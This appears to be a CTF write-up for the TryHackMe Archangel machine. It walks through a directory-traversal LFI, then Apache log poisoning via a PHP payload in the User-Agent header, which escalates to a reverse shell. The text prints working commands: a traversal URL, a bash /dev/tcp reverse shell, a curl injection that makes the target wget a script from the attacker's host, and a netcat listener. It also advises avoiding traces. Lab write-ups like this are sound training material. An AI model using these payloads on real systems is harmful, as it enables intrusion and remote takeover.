___________________

# Guide LFI (Directory traversal) / Escalation to RCE through log poisoning

First, we need to check if it is vulnerable to Directory Traversal.

<img width="1859" height="249" alt="Captura de pantalla 2026-03-12 171231" src="https://github.com/user-attachments/assets/2032b604-471a-469a-aea1-4094f708e38d" />

With this done, we are now going to verify if we can exploit the logs and therefore find a Log Poisoning vulnerability.

<img width="1919" height="574" alt="Captura de pantalla 2026-03-12 171431" src="https://github.com/user-attachments/assets/05362dd8-9753-4405-983b-290329639580" />

We confirm access to the logs:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././../var/log/apache2/access.log
```

With Log Poisoning confirmed, we are now going to inject information through the logs to confirm this vulnerability. We will send the requests using **curl**.

<img width="692" height="215" alt="Captura de pantalla 2026-03-12 174109" src="https://github.com/user-attachments/assets/caf41900-23ef-4c5e-bae4-21467c24bcc0" />

We refresh the page and check the logs.

<img width="701" height="79" alt="Captura de pantalla 2026-03-12 174051" src="https://github.com/user-attachments/assets/431077e0-2a89-47f8-9afe-4455f0394593" />

We see that our requests entered correctly. Keeping this in mind, we are going to open port 80 with Python to send a malicious script that will contain a **SHELL**.

```
#!/bin/bash
bash -i >& /dev/tcp/192.168.201.79/4444 0>&1
```
    VPN IP.

```
curl -s 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://192.168.201.79/pwnd.sh'); ?>"
```
    Request that will attack the User-Agent.

We refresh the page when sending the command.

<img width="596" height="82" alt="Captura de pantalla 2026-03-12 175718" src="https://github.com/user-attachments/assets/d8699d10-d120-4008-9e54-786bd6a48662" />

The Python connection confirms that the victim machine received it; now we are going to grant execution permissions and execute the script inside the victim machine (waiting with `nc -nlvp 4444` to receive the connection from the victim machine).

<img width="877" height="287" alt="Captura de pantalla 2026-03-13 001155" src="https://github.com/user-attachments/assets/cb69c4e8-99df-4b38-bdda-39935afe0df4" />

<img width="657" height="315" alt="Captura de pantalla 2026-03-13 001109" src="https://github.com/user-attachments/assets/cf3fd426-b7e4-472b-b00c-10b597521f5a" />

And we are in; we have successfully executed an **LFI (Directory Traversal) with Log Poisoning**. With this, we only have to escalate privileges.

### Key points

The **Archangel** machine from TryHackMe was developed; for the exploitation of this vulnerability, we focused on `/var/log`.

What exactly is `/var/log`? It is the centralized directory in Linux systems where the kernel, services (such as Apache/Nginx, SSH, MySQL), and applications write their events.

We inject the code through the **User-Agent**, and the reason for this is that through this parameter, we reach exactly the Header.

It is important as pentesters to consider not leaving traces during an attack; using Log Poisoning can be very noisy and leave traces.
